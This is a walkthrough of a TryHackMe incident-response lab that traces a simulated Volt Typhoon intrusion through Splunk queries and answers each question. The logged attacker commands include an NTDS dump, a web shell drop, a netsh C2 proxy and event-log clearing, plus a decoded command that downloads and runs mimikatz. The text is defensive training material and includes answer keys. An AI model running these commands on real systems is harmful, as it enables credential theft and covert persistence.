# [Volt Typhoon](https://tryhackme.com/room/volttyphoon)

## Investigate a suspected intrusion by the notorious APT group Volt Typhoon.

# IR Scenario

Scenario: The SOC has detected suspicious activity indicative of an advanced persistent threat (APT) group known as Volt Typhoon, notorious for targeting high-value organizations. Assume the role of a security analyst and investigate the intrusion by retracing the attacker's steps.

You have been provided with various log types from a two-week time frame during which the suspected attack occurred. Your ability to research the suspected APT and understand how they maneuver through targeted networks will prove to be just as important as your Splunk skills.

**Splunk Credentials**
Username: `volthunter`
Password: `voltyp1010`
Splunk URL: `http://MACHINE_IP:8000`

# Initial Access

Volt Typhoon often gains initial access to target networks by exploiting vulnerabilities in enterprise software. In recent incidents, Volt Typhoon has been observed leveraging vulnerabilities in Zoho ManageEngine ADSelfService Plus, a popular self-service password management solution used by organizations.

### Comb through the ADSelfService Plus logs to begin retracing the attacker’s steps. At what time (ISO 8601 format) was Dean's password changed and their account taken over by the attacker?

_Preceded by multiple attempts at unlocking the account._

1. Start broad. Pull every `adss` event that references the victim account name, sorted chronologically, so the sequence of actions tells its own story.

```
index="main" sourcetype="adss" "Dean"
| sort 0 _time
| table _time, _raw
```

2. Look for a pattern consistent with account takeover: repeated failed self-service actions, followed by a successful state-changing action, followed by follow-on account modification. That successful "Password Change" event is the actual moment of compromise.

**Results:**

```
2024-03-24 11:08:17  server-02  192.168.1.134  Account Unlock  failed
2024-03-24 11:08:42  server-02  192.168.1.134  Account Unlock  failed
2024-03-24 11:09:03  server-02  192.168.1.134  Account Unlock  failed
2024-03-24 11:09:15  server-02  192.168.1.134  Account Unlock  failed
2024-03-24 11:10:03  server-02  192.168.1.134  Account Unlock  completed
2024-03-24 11:10:22  server-02  192.168.1.134  Password Change completed  <- takeover
2024-03-24 11:11:03  server-02  192.168.1.134  Account Update   completed
```

The four failed unlock attempts in under 90 seconds are the tell. This is automated/scripted guessing against the self-service unlock flow. Once the unlock succeeds, the attacker immediately resets the password and then touches the account profile again a minute later.

**Answer:** `2024-03-24T11:10:22`

---

### Shortly after Dean's account was compromised, the attacker created a new administrator account. What is the name of the new account that was created?

1. Pivot to the `wmic` sourcetype, since WMIC is the tool Volt Typhoon consistently favors for local account and process manipulation once they have valid credentials. It's a native Windows binary, so it doesn't trip AV/EDR signatures the way dropped tooling would.

2. Bound the search window to start exactly at the takeover timestamp identified above and extend roughly an hour forward, since account creation for persistence typically happens within minutes of gaining a foothold.

```
index="main" sourcetype="wmic" earliest="03/24/2024:11:10:22" latest="03/24/2024:12:30:00"
| sort 0 _time
| table _time, *
```

**Results:**

```
wmic useraccount create UserName='voltyp-admin', Password='as&9ha2e$#&@n22n('
```

**Answer:** `voltyp-admin`

---

# Execution

Volt Typhoon is known to exploit Windows Management Instrumentation Command-line (WMIC) for a range of execution techniques. They leverage WMIC for tasks such as gathering information and dumping valuable databases, allowing them to infiltrate and exploit target networks. By using "living off the land" binaries (LOLBins), they blend in with legitimate system activity, making detection more challenging.

### In an information gathering attempt, what command does the attacker run to find information about local drives on server01 & server02?

1. Search for WMIC verbs associated with storage/disk enumeration. This is standard Discovery-phase behavior used to scope out where valuable data might physically live, and to identify targets for the AD database exfil that follows.

```
index="main" sourcetype="wmic" ("logicaldisk" OR "diskdrive" OR "volume")
| sort 0 _time
| table _time, _raw
```

**Results:**

```
2024-03-25 21:30:03 | dean-admin | server-02-main | 192.168.1.153 | wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename
```

**Answer:** `wmic /node:server01, server02 logicaldisk get caption, filesystem, freespace, size, volumename`

---

### The attacker uses ntdsutil to create a copy of the AD database. After moving the file to a web server, the attacker compresses the database. What password does the attacker set on the archive?

1. Search for the tell-tale artifacts of an NTDS extraction chain in one pass: `ntdsutil`, the resulting `ntds.dit` filename, and common archiving invocations used to stage the loot for exfiltration.

```
index="main" ("ntdsutil" OR "ntds.dit" OR "7z a" OR "rar a")
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-25 22:44:31	wmic	2024-03-25T22:44:31 | dean-admin | server-02-main | 192.168.1.153 | wmic process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil.exe \"ac i ntds\" \"ifm create full C:\Windows\Temp\tmp\temp.dit"" | executed | success |
2024-03-25 23:47:07	wmic	2024-03-25T23:47:07 | dean-admin | server-02-main | 192.168.1.153 | wmic /node:webserver-01 process call create “cmd.exe /c 7z a -v100m -p d5ag0nm@5t3r -t7z cisco-up.7z C:\inetpub\wwwroot\temp.dit” | executed | success |
```

2. Extract the `-p` flag value from the 7-Zip invocation. That's the archive password.

**Answer:** `d5ag0nm@5t3r`

---

# Persistence

Our target APT frequently employs web shells as a persistence mechanism to maintain a foothold. They disguise these web shells as legitimate files, enabling remote control over the server and allowing them to execute commands undetected.

### To establish persistence on the compromised server, the attacker created a web shell using base64 encoded text. In which directory was the web shell placed?

1. Search PowerShell and WMIC operational logs for indicators of base64 staging or decoding: `base64`, `FromBase64String`, PowwerShell's `-enc` flag, or `certutil`'s switches.

```
index="main" (sourcetype="wmic" OR sourcetype="powershell") ("base64" OR "FromBase64String" OR "-enc" OR "certutil")
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-28 21:19:23	powershell	    3/28/2024 21:19:23 PM    PowerShell    800    Pipeline Execution Details    "Pipeline execution details for command line: certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx

Context Info:
    DetailSequence=1
    DetailTotal=1

    SequenceNumber=99

    UserId=CTRL-ACC\dean-admin
    HostName=ConsoleHost
    HostVersion=5.1.17763.592
    HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
    HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
    EngineVersion=5.1.17763.592
    RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
    PipelineId=39
    ScriptName=
    CommandLine=certutil -decode C:\Windows\Temp\ntuser.ini C:\Windows\Temp\iisstart.aspx
"
```

**Answer:** `C:\Windows\Temp\`

---

# Defense Evasion

Volt Typhoon utilizes advanced defense evasion techniques to significantly reduce the risk of detection. These methods encompass regular file purging, eliminating logs, and conducting thorough reconnaissance of their operational environment.

### In an attempt to begin covering their tracks, the attackers remove evidence of the compromise. They first start by wiping RDP records. What PowerShell cmdlet does the attacker use to remove the “Most Recently Used” record?

_T1070.007_

1. Search for registry-cleanup indicators tied to RDP client history: the `Terminal Server Client` registry hive, the `MRU` value name itself, and generic item-removal cmdlets.

```
index="main" sourcetype="powershell" ("Terminal Server Client" OR "MRU" OR "Remove-ItemProperty" OR "Remove-Item")
| sort 0 _time
| table _time, _raw
```

**Results:**

```
$registryPath = "HKCU:\Software\Microsoft\Terminal Server Client\Default"
Remove-ItemProperty -Path $registryPath -Name MRU0 -ErrorAction SilentlyContinue
```

**Answer:** `Remove-ItemProperty`

---

### The APT continues to cover their tracks by renaming and changing the extension of the previously created archive. What is the file name (with extension) created by the attackers?

_Legitimate sounding file name with a phony extension._

1. Pivot off the known archive name from the NTDS-exfil step and search broadly for rename operations touching that file.

```
index="main" ("cisco-up" OR "Rename-Item" OR "ren " OR "move ")
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-26 02:02:35	wmic	2024-03-26T02:02:35 | dean-admin | server-02-main | 192.168.1.129 | wmic /node:webserver-01 process call create "cmd.exe /c ren \\webserver-01\c$\inetpub\wwwroot\cisco-up.7z cl64.gif" | executed | success |
```

2. The rename here is a straightforward extension-swap disguise. Changing a `.7z` archive to a `.gif` so that, to a cursory glance or a naive file-type filter on egress monitoring, it looks like a harmless image asset sitting in a web root rather than a compressed copy of the AD database.

**Answer:** `cl64.gif`

---

### Under what regedit path does the attacker check for evidence of a virtualized environment?

1. This is a distinct query from the "reg query for credentials" step later on. Here we're looking specifically for anti-analysis / sandbox-detection behavior, so search for hypervisor/VM vendor strings alongside registry-read cmdlets.

```
index="main" ("reg query" OR "Get-ItemProperty" OR "VMware" OR "VirtualBox" OR "VBOX" OR "Hyper-V")
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-26 21:15:18	powershell		03/26/2024 21:15:18 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=10

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=Get-ItemProperty -Path "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control" | Select-Object -Property *Virtual*
```

**Answer:** `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control`

---

# Credential Access

Volt Typhoon often combs through target networks to uncover and extract credentials from a range of programs. Additionally, they are known to access hashed credentials directly from system memory.

### Using reg query, Volt Typhoon hunts for opportunities to find useful credentials. What three pieces of software do they investigate? Answer Format: Alphabetical order separated by a comma and space.

1. This is a separate line of inquiry from the sandbox check above, even though both use `reg query`. The distinguishing factor is the target of the query. Rather than searching for virtualization vendor strings, search specifically for `reg query` invocations against software hives known to store remote-access credentials or session configuration: OpenSSH, PuTTY session data, and RealVNC.

```
index="main" ("reg query" OR "Get-ItemProperty" OR "VMware" OR "VirtualBox" OR "VBOX" OR "Hyper-V")
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-27 19:24:02	powershell		03/27/2024 19:24:02 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: reg query hklm\software\OpenSSH

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=99

UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=reg query hklm\software\OpenSSH
"
---
2024-03-27 22:26:05	powershell		03/27/2024 22:26:05 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: reg query hkcu\software\dean-admin\putty\session

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=86

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=reg query hkcu\software\dean-admin\putty\session
"
---
2024-03-27 20:46:39	powershell		03/27/2024 20:46:39 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: reg query hklm\software\realvnc

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=02

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=reg query hklm\software\realvnc
"
```

**Answer:** `OpenSSH, putty, realvnc`

---

### What is the full decoded command the attacker uses to download and run mimikatz?

1. Search PowerShell logs for the `-E` invocation switch, which is the standard way attackers pass base64-encoded PowerShell to avoid quoting/escaping headaches and to lightly obfuscate the command from casual log review.

```
index="main" sourcetype="powershell" " -E "
| sort 0 _time
| table _time, _raw
```

**Results:**

```
2024-03-26 21:53:41		03/26/2024 21:53:41 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: -exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=41

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=-exec bypass -W hidden -nop -E SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cDovL3ZvbHR5cC5jb20vMy90bHovbWltaWthdHouZXhlIiAtT3V0RmlsZSAiQzpcVGVtcFxkYjJcbWltaWthdHouZXhlIjsgU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIkM6XFRlbXBcZGIyXG1pbWlrYXR6LmV4ZSIgLUFyZ3VtZW50TGlzdCBAKCJzZWt1cmxzYTo6bWluaWR1bXAgbHNhc3MuZG1wIiwgImV4aXQiKSAtTm9OZXdXaW5kb3cgLVdhaXQ=
"
```

2. Decode the base64 blob to recover the actual payload logic, which downloads Mimikatz, runs it with `sekurlsa::minidump` against `lsass.dmp`.

**Answer:** `Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait`

---

# Discovery & Lateral Movement

Volt Typhoon uses enumeration techniques to gather additional information about network architecture, logging mechanisms, successful logins, and software configurations, enhancing their understanding of the target environment for strategic purposes.

The APT has been observed moving previously created web shells to different servers as part of their lateral movement strategy. This technique facilitates their ability to traverse through networks and maintain access across multiple systems.

### The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for? Answer Format: Increasing order separated by a space.

1. Search specifically for `wevtutil`.

```
index="main" "wevtutil"
| sort 0 _time
| table _time, sourcetype, _raw
```

2. Collect all three Event IDs and sort numerically for the final answer.

**Results:**

```
2024-03-25 22:01:41	powershell		03/25/2024 22:01:41 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]] and EventData[Data='admin']

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=50

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]] and EventData[Data='admin']
"
---
2024-03-25 22:04:56	powershell		03/25/2024 22:04:56 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4625) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]]

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=50

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4625) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]]
"
---
2024-03-26 21:31:57	powershell		03/26/2024 21:31:57 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4769) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]] and EventData[Data='admin-workstation1.domain.local']

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=92

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=wevtutil qe security /rd:true /f:text /q:*[System[(EventID=4769) and TimeCreated[@SystemTime>'2024-03-24T00:00:00']]] and EventData[Data='admin-workstation1.domain.local']
"
```

**Answer:** `4624 4625 4769`

---

### Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?

_Knowing the name of the original webshell will help you locate the new one._

1. Pivot off the known web shell filename from the Persistence phase and search for any reference to it later in the timeline. A copy operation referencing the same source file is the most direct way to catch reuse.

```
index="main" "iisstart.aspx"
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-29 19:47:43	powershell		03/29/2024 19:47:43 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=862

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=Copy-Item -Path "C:\Windows\Temp\iisstart.aspx" -Destination "\\server-02\C$\inetpub\wwwroot\AuditReport.jspx
"
```

**Answer:** `AuditReport.jspx`

---

# Collection

During the collection phase, Volt Typhoon extracts various types of data, such as local web browser information and valuable assets discovered within the target environment.

### The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell? Answer Format: Increasing order separated by a space.

1. Search for `Copy-Item` usage broadly, then filter mentally for anything touching a non-system, business-data path. In this case a folder named `FinanceBackup`, which is an obvious high-value target once discovered.

```
index="main" sourcetype="powershell" "Copy-Item"
| sort 0 _time
| table _time, _raw
```

**Results:**

```
2024-03-27 23:51:55		03/27/2024 23:51:55 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=45

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=Copy-Item -Path "C:\ProgramData\FinanceBackup\2022.csv" -Destination "C:\Windows\Temp\faudit\2022.csv"
"
---
2024-03-27 23:52:15		03/27/2024 23:52:15 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=79

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=Copy-Item -Path "C:\ProgramData\FinanceBackup\2023.csv" -Destination "C:\Windows\Temp\faudit\2023.csv"
"
---
2024-03-27 23:52:49		03/27/2024 23:52:49 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=19

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=Copy-Item -Path "C:\ProgramData\FinanceBackup\2024.csv" -Destination "C:\Windows\Temp\faudit\2024.csv"
"
```

2. Collect all three destination filenames and sort them numerically, as requested.

**Answer:** `2022.csv 2023.csv 2024.csv`

---

# C2 & Cleanup

Volt Typhoon utilizes publicly available tools as well as compromised devices to establish discreet command and control (C2) channels.

To cover their tracks, the APT has been observed deleting event logs and selectively removing other traces and artifacts of their malicious activities.

### The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy? Answer Format: IP Port

1. Search for `netsh` invocations using the `portproxy` sub-context specifically, since that's the feature used to relay traffic from a locally listening port to a remote address/port. Effectively turning the compromised host into a covert relay/pivot point without needing to drop any additional proxy software.

```
index="main" "netsh" "portproxy"
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-29 23:13:09	wmic	2024-03-29T23:13:09 | dean-admin | server-01-main | 192.168.1.184 | wmic /node: server-01 /user: dean-admin /password: uNcr4cK4b1e process call create “cmd.exe /c netsh interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=8443 connectaddress=10.2.30.1” | executed | success |
```

**Answer:** `10.2.30.1 8443`

---

### To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?

_Same log retrieval tool, different switch (for clearing logs)._

1. Search for `wevtutil` invocations using the `cl` verb specifically. This is the final, most damaging anti-forensic step in the intrusion, since it wipes the very logs that would otherwise let a SOC reconstruct everything documented in this report.

```
index="main" "wevtutil" "cl"
| sort 0 _time
| table _time, sourcetype, _raw
```

**Results:**

```
2024-03-29 22:04:23	powershell		03/29/2024 22:04:23 PM	PowerShell	800	Pipeline Execution Details	"Pipeline execution details for command line: wevtutil cl Application Security Setup System

Context Info:
	DetailSequence=1
	DetailTotal=1

	SequenceNumber=05

	UserId=CTRL-ACC\dean-admin
	HostName=ConsoleHost
	HostVersion=5.1.17763.592
	HostId=k4fke10d-42ad-4d52-a234-9d6491ee00f7
	HostApplication=C:\Windows\System32\WindowsPowerShell\1.0\powershell.exe
	EngineVersion=5.1.17763.592
	RunspaceId=0aa6c03k-c2ra-4665-l25a-73a5bb6f8098
	PipelineId=39
	ScriptName=
	CommandLine=wevtutil cl Application Security Setup System
"
```

**Answer:** `Application Security Setup System`
